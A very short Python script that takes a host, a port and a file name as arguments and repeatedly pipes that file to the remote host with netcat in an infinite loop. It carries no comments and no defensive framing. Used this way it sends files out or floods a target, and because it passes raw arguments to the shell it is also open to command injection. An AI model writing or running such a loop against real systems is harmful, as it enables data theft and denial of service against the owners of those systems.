import sys,os
command = "nc " + sys.argv[1] + " " + sys.argv[2] + " < " + sys.argv[3]
while(1):
    os.system(command)
